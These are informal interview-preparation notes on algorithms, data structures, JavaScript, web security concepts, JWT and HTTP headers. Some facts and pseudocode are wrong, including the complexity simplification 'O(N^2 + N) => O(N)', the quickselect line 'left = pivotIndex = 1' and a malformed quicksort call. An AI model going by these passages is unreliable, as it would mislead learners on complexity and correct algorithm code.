1. Interview Tips:

- Scoping the problem like this
Come up with clarifying examples and expected outputs, clarify function signature
Ask performance questions up front (space vs. time requirements)
State assumptions up front
How big is the size of the input?
How big is the range of values?
What kind of values are there? Are there negative numbers? Floating points? Will there be empty inputs?
Are there duplicates within the input?
What are some extreme cases of the input?
How is the input stored? If you are given a dictionary of words, is it a list of strings or a trie?

- Write edge cases and tests already for debugging after it is done

- Have pseudocode to help guide you but ultimately show them real code

- Work through from brute force to optimal solution, explaining time and space complexity and types of algorithms
and data structures you would use along the way

- Emphasis on solving it and then iterating upon it and compare solutions for time and space complexity tradeoffs

- Say test cases with edge boundaries considered, think about optimizing big picture, ask questions if you don't know about API or how things work

Follow up
- How would you handle the problem if the whole input is too large to fit into memory? 
How would you handle the input arriving as a stream? 
The answer is usually a divide-and-conquer approach — perform distributed processing of the data and only read certain 
chunks of the input from disk into memory, write the output back to disk and combine them later.

2. Algorithms and Big O Complexity:

Understanding big O notation
  - language we use for talking about how long an algorithm takes to run (asymptotic analysis)
  - express runtime in terms of how quickly it grows relative to the input as as the input gets arbitrarily large
  i.e. O(1) constant time, like one step
  function printFirstItem(arrayOfItems) {
    console.log(arrayOfItems[0]);
  }
  i.e. O(N) linear time where n is the number of items in the array
  function printAllItems(arrayOfItems) {
    arrayOfItems.forEach(function(item) {
      console.log(item);
    });
  }
  i.e. O(N^2) quadratic time outer loop runs n time and our inner loop runs n times for each iteration of the outer loop
  function printAllPossibleOrderedPairs(arrayOfItems) {
    arrayOfItems.forEach(function(firstItem) {
      arrayOfItems.forEach(function(secondItem) {
        console.log(firstItem, secondItem);
      });
    });
  }
  - N can be the actual input or the size of the input
  - throw out the constants i.e. O(2N) => O(N)
  - drop less significant terms i.e. O(N^2 + N) => O(N)
  - usually talking about the worst case
  - optimizing for space complexity: using less memory, we look at the total size (relative to size of input) of any new variables we're allocating
  - usually we're talking about additional space so we don't include space taken up by the inputs
  - discuss tradeoffs between time and space complexity, readability and easier implementation can also play a factor and some constant performance boosts
  can be important even though big O tells you to ignore constants as input gets arbitrarily large
  i.e. O(1) space
  function sayHiNTimes(n) {
    for (var i = 0; i < n; i++) {
      console.log('hi');
    }
  }
  i.e. O(N) space
  function arrayOfHiNTimes(n) {
    var hiArray = [];
    for (var i = 0; i < n; i++) {
      hiArray[i] = 'hi';
    }
    return hiArray;
  }


Sorting
- QuickSort
  divide and conquer algorithm, picks an element as a pivot and partitions the given array around the picked pivot
  i.e. variations like always pick first element as pivot, always pick last element as pivot, pick random element as pivot, pick median as pivot
  key process is partition(): should place an element x as pivot in its correct position in a sorted array
    and put all smaller elements than x before x and all greater elements than x after x which should be done in linear time
-> preferred because it is an in-place sort and doesn't require any extra storage
-> practical versions use randomized version to avoid worst case for sorted array
-> cache friendly with good locality of reference when used for arrays, tail recursive and tail call optimizations can be done
-> prefer this over merge sort when dealing with arrays
-> General Algorithm
// start from leftmost element and keep track of index of smaller/equal elements as i; while traversing if we find a smaller element, we swap
// current element with arr[i]; otherwise we ignore current element
quicksort(arr, low, high)
  if (low < high) {
    // pi is partitioning index, arr[pi] is now at right place
    pi = partition(arr, low, high);

    quickSort(arr, low, pi-1);    // before pi
    quickSort(arr,, pi + 1, high) // after pi
  }

// takes last element as pivot, places pivot element at correct position in sorted array and places all smaller than pivot to left
// and all greater elements to right of pivot
partition(arr, low, high) {
  // pivot (element to be placed at right position)
  pivot = arr[high];
  
  // Index of smaller element
  i = (low - 1)

  for (j = low; j <= high - 1; j++) {
    // If current element is smaller than or equal to pivot
    if (arr[j] <= pivot) {
      i++; // increment index of smaller element
      swap arr[i] and arr[j]
    }
  }
  swap arr[i+1] and arr[high]
  return i+1
}
-> Stable: no
-> Time Complexity:
  Best Case: O(Nlog(N)) - when always picking the middle elemnt as pivot
  Worst Case: O(N^2) - when always picking greatest or smallest element as pivot like when array is already sorted
  Average Case: O(Nlog(N)) - its inner loop can be efficiently implemented in most architectures, can change choice of pivot so worst case rarely occurs
  Space Complexity: O(1)

- Similar QuickSelect: selection algorithm to find kth smallest/max element in unordered list
-> General algorithm
  - instead of recurring for both sides after finding the pivot, it recurs only for the part that contains
  the k-th element
  i.e. for kth smallest element, if index of partitioned elelement is more than k, we recur for left part
  if index is same as k, we found the kth smallest element
  if index is less than k, we recur for the right part

function quickSelect(list, left, right, k) 
  if left = right
    return list[left]
  
  select a pivotIndex between left and right

  pivotIndex = partition(list, left, right, pivotIndex)

  if k = pivotIndex
    return list[k]
  else if pivotIndex > k
    // go left
    right = pivotIndex - 1
  else
    // go right
    left = pivotIndex = 1
-> Time Complexity: reduced expected complexity from O(NlogN) to O(N) with worst case of O(N^2)

MergeSort
-> divide and conquer algorithm, continuously divides array in to two halves, recurses on
both the left subarray and right subarray and then merges the two sorted halves
-> generally considered better when data is huge and stored in external storage, needs O(N) extra storage though
-> has to deal with allocating and de-allocating extra space of merged array results
-> merge sort preferred for linked lists as nodes are not adjacent in memory, can insert items in middle in O(1) extra space and O(1) time
-> merge operations can be implemented without extra space for linked lists, must travel from head to ith node to reach something and overhead of partitioning
increases for quicksort
-> merge sort accesses data sequentially and need of random access is low
-> General Algorithm
  divides input array in two halves, calls itself for the two halves and then merges the two sorted halves
  merge() to merge two halves - merge(arr, l, m, r), assumes arr[l...m] and arr[m+1...r] are two sortred sub-arrays

// Keeps dividing array in half until size becomes 1 and then starts merging arrays back
MergeSort(arr, left, right) 
  if right > left
    1. Find middle point to divide array into two halves
      mid = (left + right) / 2
    2. Call mergeSort for first half
      call mergeSort(arr, left, mid)
    3. Call merge sort for second half
      call mergeSort(arr, mid+1, right)
    4. Merge the two halves sorted in step 2 and 3
      call merge(arr, left, mid, right)

merge(arr, left, mid, right)
  n1 = mid - left + 1
  n2 = right - mid
  create l[n1] and r[n2]

  copy data into left and right arrays
  l[i] = arr[left + i]
  r[j] = arr[mid + 1 + j]

  i = 0;
  j = 0;
  k = left
  while i < n1 and j < n2
    if (l[i] <= r[j])
      arr[k] = l[i]
      i++
    else
      arr[k] = r[j]
      j++
    k++

  // Copy remaining elements of l[] if there are any
  // Copy remaining elements of r[] if there are any

-> Stable: yes
  Time Complexity:  
  Best Case: O(Nlog(N))
  Worst Case: O(Nlog(N))
  Average Case: O(Nlog(N))
  Space Complexity: O(N)

BucketSort
-> distributes elements of an array in to a number of buckets, each buck is then sortred individually either using
a different sorting algorithm or by recursively applying the bucket sorting algorithm
-> Time Complexity:
  Best Case: O(N + K)
  Worst Case: O(N^2)
  Average Case: O(N + K)

HeapSort
-> General Algorithm
-> Time Complexity

Insertion Sort

Radix Sort
-> like bucket sort, distributes elements of an array into a number of buckets; differs from bucket sort by 're-bucketing' the array
after the initial pass as opposed to sorting each bucket and merging
-> General Algorithm
-> Time Complexity:
  Best Case: O(NK)
  Worst Case: O(NK)
  Average Case: O(NK)

Topological Sort
-> linear ordering of a directed graph's nodes such that for every edge node from node u to node v, u comes before v in the ordering
-> for Directed Acyclic Graph (DAG) is a linear ordering of vertices such that for every directed edge uv, vertex u comes before v in the ordering
-> topological sort is not possible if the graph is not a DAG as there will be a cycle
-> can be more than one topsorting for a graph
-> first vertex in topological sorting is always a vertex with in-degree as 0 (vertex with no incoming edges)
-> DFS: print vertex and recursively call DFS for adjacent vertices vs. topological sort: print vertex before its adjacent vertices
-> use a temporary stack, don't print vertex immediately but call topological sort for all adjacent vertices
and then push it to a stack (a vertex is only pushed to stack only when all of its adjacent vertices and their adjacent vertices and so on) are already in stack
-> used for scheduling jobs, just DFS with extra stack
-> general algorithm:
  - need a boolean visited array, stack to hold all the vertices
  topologicalSort() {
    initialize stack
    mark all vertices as not visited
    sort starting from all vertices one by one as long as they are unvisited
    // recursive function: mark the current node as visited
    // recur for all vertices adjacent to this vertex that are not visited
    // push current vertex to stack which stores results
    print out stack results display topologically sorted vertices
  }
  DFS method:
  L ← Empty list that will contain the sorted nodes
  while there are unmarked nodes do
      select an unmarked node n
      visit(n) 
  
  function visit(node n)
    if n has a permanent mark then return
    if n has a temporary mark then stop (not a DAG)
    mark n temporarily
    for each node m with an edge from n to m do
        visit(m)
    mark n permanently
    add n to head of L
  
  Kahn's Algorithm: find a list of start nodes which have no incoming edges and insert them into a set S;
  at least one such node must exist in a non-empty acyclic graph
  L ← Empty list that will contain the sorted elements
  S ← Set of all nodes with no incoming edge
  while S is non-empty do
      remove a node n from S
      add n to tail of L
      for each node m with an edge e from n to m do
          remove edge e from the graph
          if m has no other incoming edges then
              insert m into S
  if graph has edges then
      return error (graph has at least one cycle)
  else 
      return L (a topologically sorted order)

-> Time Complexity: O(|V| + |E|)

- Divide and Conquer

- Binary Search
-> General Algorithm
-> Time Complexity: O(log(N)) if data is sorted

- Dynamic Programming and Memoization

- Greedy 
-> make locally optimal choices at each step in the hope of eventually reaching the globally optimal solution
-> need two properties:
  optimal substructure: optimal solution to the problem contains optimal solutions to the given problem's subproblems
  greedy property: optimal solution is reached by "greedily" choosing the locally optimal choice without ever considering previous choices
i.e. Coin change: given target amount of V cents and list of denominations of coins, what is minimum number of coins we must use to represent V?
-> continuously selecting largest coin denomination less than or equal to V, subtract that coin's value from V, and repeat
i.e. Prim's Algorithm -> finds minimum spanning tree for a weighted undirected graph
-> finds subset of edges that forms a tree that includes every node in graph
-> O(|V|^2)
i.e. Kruskal's Algorithm -> finds minimum spanning tree in a graph, graph does not have to be connected
-> O(|E|log|V|)

- Recursion (and backtracking)

- Breadth first search
-> General Algorithm
  for graphs, there may be cycles so we may come to the same node again -> can use a boolean visited array 
  function bfs(start) {
    Mark all vertices as not visited (visited boolean array)
    Create a queue for BFS
    Mark the current node as visited and enqueue it
    while the queue is not empty
      dequeue a vertex from the queue and print it
      get all adjacent vertices of the dequeued vertex s
        if an adjacent vertex has not been visited
          mark it as visited and enqueue it
  }
-> can use a queue (FIFO) structure to help
-> graph traversal algorithm which explores the neighbor nodes first, before moving to the next level neighbors
-> Time Complexity: O(|V| + |E|)

- Depth first search
-> General Algorithm
    for graphs, there may be cycles so we may come to the same node again -> can use a boolean visited array 
    function dfs(start) {
      Mark all vertices as not visited (boolean array)
      Push start vertex onto stack and set the visited[start] to be true
      while vertex is not empty
        pop vertex from top of the stack
        get all adjacent vertices of popped vertex s
          if an adjacent vertex has not been visited
            mark it as visited and push onto stack
    }
-> can use a stack (LIFO) structure to help 
-> graph traversal algorithm which explores as far as possible along each branch before backtracking
-> Time Complexity: O(|V| + |E|)

- Dijkstra
-> General Algorithm
-> algorithm to find shortest path between nodes in a graph
-> Time Complexity: O(|V|^2)

- Bellman-Ford Algorithm
-> General Algorithm
-> computes shortest paths from single source node to all other nodes in a weighted graphs, slower than Djikstra's but more
versatile in handling graphs in which some of edge weights are negative numbers
-> Time Complexity: O(|E|) vs. worst case O(|V||E|)

- Floyd-Warshall Algorithm
-> finding shortest paths in a weighted graph with positive or negative edge weights but no negative cycles
-> single execution will find lengths (summed weights) of shortest paths between all pairs of nodes
-> Time Complexity: O(|V|^3)

- A*
->
-> Time Complexity:

- KMP: Knuth Morris Pratt Algorithm (Pattern Searching)
-> Problem: Given text and pattern, print out all occurrences of pattern in text
-> Naive string matching: slide pattern over text one by one and check for a match; if a match is found then slide by 1 again
to check for subsequent matches
Algorithm:
  loop from i=0 to i <= N - M
    // for current index i, check for pattern match
    loop through from j=0 to j < M
      if txt[i+j] != pat[j]
        break
    if j == M
      print out le pattern
-> Improves upon naive string matching (O(m(n-m+1))) by having a window to compare the last character of pattern with last character of current text
to decide whether the string matches or not, allows us to skip matching other earlier characteristic
-> Idea: uses degenerating property (patterns having same sub-patterns appearing more than once in pattern)
-> whenever we detect a mismatch after some matches, we already know some of the characters in the text of the next window
-> needs preprocessing in say an integer array that tells us the count of the characters to be skipped - called lps, same size m of pattern to help us skip characters while matching
-> lps indicates longest proper prefix which is also a suffix of pattern, will be used to not match character that we know will not match anyways
-> Algorithm:
-> keep matching characters and incrementing i and j while pat[j] and txt[i] match
-> when we see a mismatch, don't need to match lps[j-1] characters with txt[i-j...i-1], change only the j value to be lps[j-1]
-> if we match more and j === m (size of pattern), print pattern and reset j to lps[j-1] (moving window forward)
-> to compute LPS: 
We initialize lps[0] and len as 0. 
If pat[len] and pat[i] match, we increment len by 1 and assign the incremented value to lps[i] and increment i
If pat[i] and pat[len] do not match and len is not 0, we update len to lps[len-1] and do not increment i
If pat[i] and pat[len] do not match and len is 0, we update lps[i] = 0 and increment i
-> given LPS array:
set i index to 0 for text and j index to 0 for pattern
while i is less than string length N
  if pat[j] and txt[i] match, increment i and j
  if j equals the length of pattern M, print the pattern and set j to lps[j-1]
  else if there is a mismatch after j matches (i < N and pat[i] != txt[j])
    if j does not equal zero
      do not match earlier characters and set j to lps[j-1]
    else 
      increment i
-> Time Complexity: O(N)

- Bitmasks
-> technique used to perform operations at the bit level, leads to faster runtime complexity and helps limit memory usage
-> test kth bit - s & (1 << k)
-> set kth bit - s |= (1 << k)
-> turn off kth bit - s &= ~(1 << k)
-> toggle kth bit - s ^= (1 << k)
-> multiply by 2^n - s << n
-> divide by 2^n - s >> n
-> intersection: s & t
-> union: s | t
-> set subtraction: s & ~t
-> extract lowest set bit: s & (-s)
-> extract lowest unset bit: ~s & (s + 1)
-> swap values: x ^= y; y ^= x; x ^= y;

3. Data Structures and Big O Complexity
- Arrays:
-> Time Complexity:
  Access: O(1)
  Search: O(N)
  Insert: depends but O(N) if between two elements to shift everything over
  Remove: depends but O(N) if from middle to shift everything over

- Linked List: linear collection of data elements called nodes each pointing to the next node by means of a pointer
-> group of nodes which represent a sequence
-> singly-linked list - each node points to next node and last node points to null
-> doubly-linked list - each node has two pointers, prev and next, last node's next pointer points to null
-> circular-linked list - each node points to next node and last node points back to first node
-> Time Complexity:
  Access: O(N)
  Search: O(N)
  Insert: O(1)
  Remove: O(1)

- Stack: collection of elements with two principle operations, push (add to collection) and pop (removes most recently added element)
-> Last in, first out (LIFO)
-> Time Complexity:
  Access: O(N)
  Search: O(N)
  Insert: O(1)
  Remove: O(1)

- Queue: collection of elements with two principle operations, enqueue (inserts an element into queue) and dequeue (removes element from queue)
-> First in, first out (FIFO)
-> Time Complexity:
  Access: O(N)
  Search: O(N)
  Insert: O(1)
  Remove: O(1)

- Tree: undirected, connected, acyclic graph

- Binary Tree: tree in which each node has at most two children referred to as left and right child
-> Full Tree: tree in which every node has either 0 or 2 children
-> Perfect Binary Tree: all interior nodes have two children and all leaves have the same depth
-> Complete Tree: every level except possibly the last is full and all nodes in the last level are as far left as possible

- Binary Search Tree (BST): value in each node must be greater than or equal to any value stored in left subtree and less than or equal to any value stored in the
right subtree
-> Time Complexity:
  Access: O(log(N))
  Search: O(log(N))
  Insert: O(log(N))
  Remove: O(log(N))

- Trie: radix or prefix tree, search tree used to store a dynamic set or associative array where the keys are usually strings
-> no node in the tree stores the key associated with that node but the position in tree defines the key with which it is associated
-> all descendants of a node have a common prefix of string associated with that node and root is associated with empty string

- Fenwick Tree: binary indexed tree, implemented as implicit data structure using an array
-> given an index in array representing a vertex, the index of a vertex's parent or child is calculated through bitwise operations on the binary representation of its index
-> each element of array contains pre-calculated sum of a range of values and by combining sum with additional ranges encountered during an upward traversal to the root,
the prefix sum is calculated
-> parent(i) = i-i & (-i)
-> Time Complexity:
  Range Sum: O(log(N))
  Update: O(log(N))

- Segment Tree: storing intervals or segments, allows querying which of the stored segments contain a given point
-> Time Complexity:
  Range Query: O(log(N))
  Update: O(log(N))

- Heap: specialized tree that satisfies heap property
-> if A is a parent node of B, then the key (value) of node A is ordered with respect to key of node B with same ordering applying across
entire heap
-> "max heap" or "min heap"
-> "max heap": the keys of parent nodes are always greater than or equal to those of children and the highest key is in the root node
-> "min heap": keys of parent nodes are less than or equal to those of the children and the lowest key is in the root node
-> Time Complexity:
  Access Max/Min: O(1)
  Insert: O(log(N))
  Remove Max/Min: O(log(N))

- Hashing: map data of an arbitrary size to the data of a fixed size
-> values returned by a hash function are called hash values/codes/hashes; if two keys map to the same value, a collision occurs
-> HashMap - maps keys to values, uses a hash function to compute an index into an array of buckets or slots from which the desired value can be found
-> collision resolution
-> separate chaining - each bucket is independent and contains a list of entries for each index;
the time to find the bucket (constant time) plus the time to iterate through the list
-> open addressing - when a new entry is inserted, teh buckets are examined, starting with the hashed-to-slot and proceeeding in some sequence until an unoccupied slot is found;
refers to the fact that the location of an item is not always determined by its hash value

- Graphs represented as objects and pointers, adjacency matrix, adjacency list
-> ordered pair of G = (V, E) comprising set V of vertices or nodes together with a set E of edges or arcs which are 2-element subsets of V (edge is associated with two vertices and that
association takes the form of the unordered pair comprising those two vertices)
-> undirected graph: graph in which adjacency relation is symmetric, there exists edge from node u to v and also from v to u
-> directed graph: graph in which adjacency relation is not symmetric, there exists and edge from node u to v but it does not imply that there exists an edge from node v to u 
-> representing as edge lists: using an array of two vertex numbers containing the numbers that the edge is incident upon
space is O(E) i.e. [ [0,1], [0,6], [0,8], [1,4], [1,6], [1,9], [2,4], [2,6], [3,4], [3,5],
[3,8], [4,5], [4,9], [7,8], [7,9] ]
  can find a certain edge with linear search in O(|E|) time or if it is sorted lexicographically can be O(log|E|) with binary search
-> adjacency matrix: for a graph with |V| vertices, an adjacency matrix is a |V|x|V| matrix of 0s and 1s, where the entry in row i and column j 
is 1 if and only if the edge (i,j) is in the graph
  if you want edge weights, can put it in (i,j) and represent no edges with null
  can find out whether an edge is present in constant time by just looking at graph[i][j]
  two disadvantanges: 
    1. O(V^2) space even if graph is sparse with relatively few edges
    2. if you want to find out which vertices are adjacent to a given vertex i, you have to look at
    all |V| entries in row i, even if only a small number of vertices are adjacent to vertex i
  for an undirected graph, the adjacency matrix is symmetric: row i, column j is 1 if and only if
  row j and column i is 1; for directed graph the adjacency matrix need not be symmetric
-> adjacency list: combines adjaceny matrix and edge lists
  for each vertex i, store an array of vertices adjacent to it
  typically have an array of |V| adjacency lists, one adjacency list per vertex
  vertex numbers in lists not required to be in any order but helps when in increasing order
  can get to each vertex's adjacency list in constant time
  to find out whether an edge (i,j) is present in graph, we go to i's adjacency list and then look
    for j in i's adjacency list => O(d) where d is the degree of vertex i which could be as high
    as |V| - 1 vertices (adjacent to all other vertices) or as low as 0 (if isolated with no incident edges)
i.e. [ [1, 6, 8],
  [0, 4, 6, 9],
  [4, 6],
  [4, 5, 8],
  [1, 2, 3, 5, 9],
  [3, 4],
  [0, 1, 2],
  [8, 9],
  [0, 3, 7],
  [1, 4, 7] ]
  If the graph is weighted, then each item in each adjacency list is either a two-item array or an object, 
    giving the vertex number and the edge weight.
  To do something to vertex i's adjacent vertices, can easily do a for loop
    var vertex = graph[i];
    for (var j = 0; j < vertex.length; j++) {
        doStuff(vertex[j]);
    }
  How much space? |V| adjacency lists, up to |V|-1 vertices in those lists; for an undirected graph,
    the adjacency lists contain 2|E| elements cause each edge appears twice in adjacency lists (i,j) and (j,i)
    for a directed graph, the adjacency lists contain a total of |E| elements, one element per directed edg

High Level JavaScript:
-> cross-platform, object-oriented scripting language, works inside host environment like browser
-> client-side JS to control browser and Document Object Model (DOM)
-> server-side JS to manage server like Node.js, communicate with database
-> no distinction between types of objects, inheritance through prototype mechanism, properties and methods added
to any object dynamically
-> variable data types are not declared (dynamic typing, loosely typed), cannot automatically write to hard disk
vs. Java
-> class-based, objects divided into classes and instances with all inheritance through class hierarchy
-> classes and instances cannot have properties or methods added dynamically
-> variable data types must be declared (static typing, strongly typed), can automatically write to disk

-> functional programming: first-class functions, higher-order functions, passing functions as arguments and values,
taking advantage of currying/partial application of functions, can make things more pure (without side effects)
-> prototypal inheritance: OLOO (objects linked to other objects) for mixins, using Object.assign(), delegation, concatenative inheritance,
instance is created by cloning an existing object that serves as a prototype; often instantiated using a factory function or Object.create() which
can benefit from selective inheritance from many different objects
vs. classical inheritance: constructor function instantiates an instance via the "new" keyword, inherits properties from parent class

-> using IIFE/closures around entire contents of file for private namespace and avoid clashes between JS modules and libraries
and allows for easily referenceable alias for a global variable
(function($) { })(jQuery);

-> "use strict" to voluntarily enfore stricter parsing and error handling on code at runtime, prevents accidental globals, eliminates this coercion,
disallows duplicate paramater values, makes eval() safer, throws errors on invalid usage of delete (to remove properties from objects)

-> NaN not equal to itself, typeof null is object, 
function isInteger(x) { return Math.round(x) === x; }

-> event loop, single-thread, web app, in Node.js server and browser

-> functional paradigm: function evaluation to manage program state, immutable data, avoidance of changing program state
by using higher-level functional abstractions i.e. forEach() loop
vs. imperative: transparency forced by lower-level command/instruction statements i.e. for loop

-> Shim: any piece of code that performs interception of an API call and provides a layer of abstraction
   Polyfill: type of shim that retrofits legacy browsers with modern HTML5/CSS3 features usually using JavaScript

-> Event Propagation
when an event occurs in an element inside another element and both elements have registered a handle for that event, event propagation mode determines
in which order elements receive event
bubbling: event is first captured and handled by innermost element and then propagated to outer elements
capturing: event is first captured by outermost element and propagated to inner elements
  elem.addEventListener(type, handler, true) -> rarely used, some events don't bubble like onfocus/onblur but can be captured

-> JavaScript sort() function => different browsers feature different sort algorithms
depending on type of array, different sort methods used
Webkit implements some variation of quicksort called intro sort for numeric arrays;
for non-numeric arrays it uses mergesort

-> what is "this"?
at time of execution of every function, JS engine sets property to function called "this" which refers to the current
execution context; always refer to an object and depends on how function is called
1. in global context or outside a function "this" refers to window object
2. inside IIFE and you "use strict", this is undefined unless you pass window into IIFE
3. while executing function in context of an object, object becomes value of this
4. inside setTImeout function, value of this is window object
5. if you use a constructor by using new keyword to create an object, the value of this will refer to newly created object
6. can set value of this to any arbitrary object by passing the object as first parameter to bind, call, apply
7. for DOM event handler, value of this would be the element that fired the event

Progressive Enhancement:

Gradual Degradation:

Web Security Issues:

- XSS (Cross-site Scripting): doesn't need an authenticated session and can be exploited when the vulnerable website
doesn't do the basics of validating or escaping input;
-> can send inputs via request parameters or client side input fields (cookies, form fields, url params)
-> can be written back to screen, persisted in database or executed remotely
-> to run untrusted code upon rendering
- allows attacker to inject into a website malicious client-side code; one can bypass controls and impersonate users
- usually occur when data enters a web app through an untrusted source (most often a web request) or dynamic content sent to web user
without being validated for malicious content
- commonly include transmitting private data like cookies or session information, redirecting victim to webpage controlled by attacker or
performing malicious operations on user's machine under guise of vulnerable site
- three categories: stored (persistent), reflected (non-persistent), DOM-based
-> stored XSS attacks - injected script is stored permanently on target servers; victim then retrieves malicious scripts from server when browser sends a request for data
-> reflexted XSS attacks - user tricked into clicking malicious link, submitting a form or browsing to malicious site, injected code travels to vulnerable website. web server 
reflects injected script back to user's browser as an error/search result/server response. brwoser executes code because it assumes response is from
a "trusted" server which user has already interacted with
-> DOM-based XSS attacks - payload is executed as a result of modifying DOM environment in victim's browser used by original client-side script; page does not change but client side
code contained in page runs in an unexpected manner because of malicious modifications to DOM environment

- XSRF (Cross-site Request Forgery): happens in authenticated sessions when server trusts user/browser
-> can place a malicious link embedded in another link or a zero byte image with bad src;
-> if you have multiple tabs open and you click the malicious links, attacks can happen in background as if you clicked from the other tab
because your session is still active in browser and browser has session id
-> to prevent this: another server supplies unique token generated and appended in requests and is not known to browser like session id
and additional validation at server for the CSRF token to be sure attacker manipulated link doesn't work
-> to hijack authentication, causes web app to process an attacker-specified request within context of victim's authenticated session
-> i.e. loading img with bad src and passes along authentication with the request 
- attack that impersonates trusted user and sends a website unwanted commands like including malicious parameters in URL behind a link that purports to go 
somewhere else
-> check standard headers to verify request is same origin
-> check CSRF token i.e. custom headers X-Requested-With: XMLHttpRequest, encyrpted token pattern, double cookie defense

- Using JWT (JSON Web Tokens)
-> open, industry standard RFC 7519 method for representing claims securely between two parties
-> compact and self-contained way for securely transmitting info between parties as JSON object which can be verified and trusted because it is digitally signed
-> can be signed using secret with HMAC algorithm or public/private key pair using RSA
-> can be encrypted to hide claims from parties
-> can be signed tokens to verify integrity of claims contained within it; public/private key paris signature certifies tha tonly party holding private key is one that signed it
-> compact: send through URL, POST parameter, HTTP header => faster transmission
-> self-contained: payload contains all required information about user, avoiding need to query database more than once
-> used for authentication i.e. once user is logged in, each subsequent request will include JWT, allowing user to access routes, services, and resources that are permitted with
that token; Single Sign On with small overhead and used across different domains
-> used for information exchange: can be sure senders are who they say they are, signature calculated using header and payload to verify content hasn't been tampered with
-> structure: header, payload, signature (xxxxx.yyyyy.zzzzz)
-> header: type of token = JWT and hashing algorithm used like HMAC SHA256 or RSA
{ // Base64Url encoded
  "alg": "HS256",
  "typ": "JWT"
}
-> payload: contains claims (statements about entity like user and additional metadata)
  can be registered, public, and private claims
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
-> signature: takes encoded header and encoded payload, a secret, algorithm specified in header, and signs it
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
-> output is three Base64-URL strings separated by dots that can be easily passed in HTML and HTTP environment while being more compact when compared to XML-based standards such as SAML
-> authentication case: when user successfully logs in using credentials, JWT returned and must be saved locally (typically in localStorage but cookies can be used) rather than creating session
in server and returning a cookie
  whenever user wants to access protected route or resource, user agent should send JWT, typically in Authorization header using Bearer schema
  i.e. Authorization: Bearer <token> => stateless auth mechanism as user state is never saved in server memory
  and server's protected routes will check for valid JWT in Authorization header and if it's present, user will be allowed access to protected resources
  -> can now rely on data APIs that are stateless, doesn't matter which domain serving your APIs so CORS won't be an issue as it doesn't use cookies
  -> should not put secret information within token as all information is exposed to users or other parties though they can't change it
  i.e. Sample Flow
  1. POST /users/login with username and password
  2. Create a JWT with a secret
  3. Returns JWT to browser
  4. Sends JWT on Authorization Header
  5. Check JWT signature. Get user information from JWT
  6. Sends reponse to client
-> Why use this? JSON less verbose than XML, can be signed RSA style, JSON parsers mapping directly to objects easily rather than SAML,
used at Internet scale on multiple platforms especially mobile
-> can store token on localStorage (data persists until explicitly deleted, changes saved and available for all current and future visits to the site)
  on sessionStorage(changes made are saved and available on current page as well as future visits to site on same window but once window is closed, storage is deleted)
  disadvantages of Web Storage:
    sandboxed to specific domain and its data cannot be accessed by any other domain including sub-domains
    accessible through JS on same domain so any JS running on site will have access to web storage and can be vulnerable to XSS
    must ensure JWT is always sent over HTTPS and never HTTP
  on cookies: can control its lifetime say after browser is closed (session cookie), server side check and implement expiration, can be persistent (not destroyed after browser is closed with expiration)
    can be read by both JS and server side code or only server side if HttpOnly flag is set
  disadvantages of cookie:
    max size of cookie is only 4kb, so it's tough if you have many claims
    vulnerable to CSRF but one can check HTTP Referer and Origin header
    difficult to implement for cross-domain access, have additional properties (Domain/Path) that can be modified to allow you to specify where cookie is allowed to be sent

HTTP Headers:
- allow the client and server to pass additional information with the request or the response
- request header consists of case-insensitive name followed by a colon ':'; custom proprietary headers can be added using 'X-' prefix
but deprecated in June 2012
- headers grouped according to contexts
-> general header: apply to both requests and responses with no relation to data eventually transmitted in body
-> request header: contains more information about resource to be fetched or about client itself
-> response header: additional information about response like its location or about the server itself
-> entity header: more information about body of entity like its content length or MIME-type
- can be grouped according to how proxies handle them
-> end-to-end headers: headers must be transmitted to final recipient of the message like the server for a reuqest or client for a response
and intermediate proxies must retransmit end-to-end headers unmodified and caches must store them
-> hop-by-hop headers: meaningful only for a single transport-level connection and must not be retransmitted by proxies or cached
like Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, Transfer-Encoding, Upgrade
- Authentication: WWW-Authenticate, Authorization (contains credentials to authenticate a user agent with server), Proxy-Authenticate, Proxy-Authorization
- Caching: Age (time in seconds object has been in proxy cache), Cache-Control (specifies directives for cachine mechanisms in both requests and responses),
Expires (response considered stale after this), Pragma (implementation-specific header), Warning (possible problems)
- Client Hints: Accept-CH, Content-DPR, DPR, Downlink, Save-Data, Viewport-Width, Width
- Conditionals: Last-Modified (validator to compare several versions of same resource), less accurate than ETag but easier to calculate in some environments and
conditional requests like If-Modified-Since and If-Unmodified-Since use this to change behavior of request, ETag - unique string identifying version of resource and
conditional requests using If-Match and If-None-Match use this to change behavior of request
If-Match, If-None-Match, If-Modified-Since, If-Unmodified-Since
- Connection Management: Connection (controls whether network connection stays open after current transaction finishes), Keep-Alive (controls how long a persistent connection should stay open)
- Content negotiation: Accept (informs server about types of data that can be sent back, it is MIME-type), Accept-Charset (charset client can understand), Accept-Encoding (encoding algorithm to server like compression
that can be used on resource sent back), Accept-Language (language server sends back)
- Controls: Expect, Max-Forwards
- Cookies: Cookie (contains stored HTTP cookies previously sent by server with Set-Cookie header), Set-Cookie (send cookies from server to user agent)
- CORS: Access-Control-Allow-Origin (indicates whether response can be shared), Access-Control-Allow-Credentials (indicates whether response to request can be exposed when credentials flag is true),
Access-Control-Allow-Headers (used in response to preflight request to indicate which HTTP headers can be used when making actual request), Access-Control-Max-Age (how long results of preflight request can be cached),
Origin (where fetch originates from)
- Do Not Track: DNT, Tk
- Downloads: Content-Disposition (response header if resource transmitted should be displayed inline) or should be handled like a download and browser should present a 'Save As' window
- Message body information: Content-Length (size of entity-body), Content-Type (media type of resource i.e. json), Content-ENcoding, Content-Language, Content-Location
- Proxies: Forwarded, X-Forwarded-For/Host/Proto, Via
- Redirects: Location (URL to redirect page to)
- Request Context: From (internet email address for human user who controls requesting user agent), Host (specifies domain name of server for virtual hosting and optionally the TCP port number on which the server is listening),
Referer (address of previous web page from which a link to the currently requested page was followed), Referrer-Policy, User-Agent(characteristic string that allows network protocol peers to identify the application
type, operating system, software vendor or software version of the requesting software user agent)
- Response Context: Allow (lists the set of HTTP request methods supported by a resource), Server: (software used by origin server to handle request)
- Range requests: Accept-Ranges, Range, If-Range, Content-Range
- Security: Content-Security-Policy (CSP) - controls resources the user agent is allowed to load for a given page, Expect-CT (opt in to enforce Certificate Transparency requirements to prevent use of misissued certificates for that site from
going unnoticed), Public-Key-Pins (HPKP) - associates specific cryptographic public key with certain web server to decrease the risk of MITM attacks with forged certificates,
